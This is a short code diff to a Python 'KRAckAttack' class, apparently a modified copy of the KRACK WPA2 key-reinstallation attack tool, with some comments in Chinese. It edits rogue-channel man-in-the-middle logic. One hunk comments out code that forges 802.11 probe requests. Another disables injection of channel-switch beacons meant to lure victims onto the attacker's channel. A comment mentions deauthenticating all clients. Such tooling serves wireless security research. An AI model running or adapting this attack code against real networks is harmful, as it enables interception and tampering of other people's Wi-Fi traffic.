@@ -479,14 +479,14 @@ class KRAckAttack():
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				if (p.haslayer(Dot11ProbeReq)):
-					essid = Dot11Elt(ID='SSID', info=self.netconfig.ssid)
-					# rates  = Dot11Elt(ID='Rates',info=self.rates)
-					dsset = Dot11Elt(ID='DSset',info=bytes([self.netconfig.real_channel]))
-					dot11 =  Dot11(type=0, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac)
-					np = dot11/Dot11ProbeReq()/essid/dsset
-					self.sock_real.send(np, True, self.netconfig.real_channel)
-				# print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+				# if (p.haslayer(Dot11ProbeReq)):
+				# 	essid = Dot11Elt(ID='SSID', info=self.netconfig.ssid)
+				# 	# rates  = Dot11Elt(ID='Rates',info=self.rates)
+				# 	dsset = Dot11Elt(ID='DSset',info=bytes([self.netconfig.real_channel]))
+				# 	dot11 =  Dot11(type=0, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac)
+				# 	np = dot11/Dot11ProbeReq()/essid/dsset
+				# 	self.sock_real.send(np, True, self.netconfig.real_channel)
+				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
@@ -624,7 +624,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
-		self.send_csa_beacon(numbeacons=4)
+		# self.send_csa_beacon(numbeacons=4)
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
